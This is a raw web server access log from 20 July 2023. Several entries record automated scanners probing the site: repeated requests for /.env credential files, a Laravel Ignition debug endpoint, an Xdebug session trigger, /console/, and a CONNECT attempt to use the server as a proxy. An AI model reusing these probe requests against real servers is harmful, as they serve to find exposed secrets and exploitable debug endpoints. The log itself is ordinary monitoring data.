95.142.124.35 - - [20/Jul/2023:05:01:07 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.142.124.35 - - [20/Jul/2023:05:01:07 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [20/Jul/2023:05:06:30 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [20/Jul/2023:05:06:30 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [20/Jul/2023:05:07:46 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
213.109.202.66 - - [20/Jul/2023:05:39:17 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2015 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.79.181.223 - - [20/Jul/2023:05:47:22 +0000] "\x16\x03\x01" 400 488 "-" "-"
51.79.29.48 - - [20/Jul/2023:05:59:42 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [20/Jul/2023:05:59:43 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.78.249.41 - - [20/Jul/2023:05:59:51 +0000] "GET / HTTP/1.1" 200 2052 "-" "python-requests/2.31.0"
143.110.222.166 - - [20/Jul/2023:06:05:14 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.189.182.234 - - [20/Jul/2023:06:07:33 +0000] "GET / HTTP/1.1" 400 488 "-" "-"
213.109.202.66 - - [20/Jul/2023:06:28:30 +0000] "GET /console/ HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.29.136.19 - - [20/Jul/2023:06:28:37 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
51.79.29.48 - - [20/Jul/2023:06:42:37 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [20/Jul/2023:06:42:38 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
213.109.202.66 - - [20/Jul/2023:07:07:29 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [20/Jul/2023:07:10:01 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
213.109.202.66 - - [20/Jul/2023:07:29:52 +0000] "GET / HTTP/1.1" 200 2015 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
199.254.199.244 - - [20/Jul/2023:07:42:35 +0000] "CONNECT create.roblox.com:443 HTTP/1.1" 200 5374 "-" "Go-http-client/1.1"
199.254.199.244 - - [20/Jul/2023:07:42:35 +0000] "\x16\x03\x01\x01\x04\x01" 400 0 "-" "-"
147.182.214.61 - - [20/Jul/2023:07:55:00 +0000] "GET /geoip/ HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
147.182.214.61 - - [20/Jul/2023:07:55:00 +0000] "GET /files/ HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.181.251 - - [20/Jul/2023:08:06:48 +0000] "\x16\x03\x01" 400 488 "-" "-"
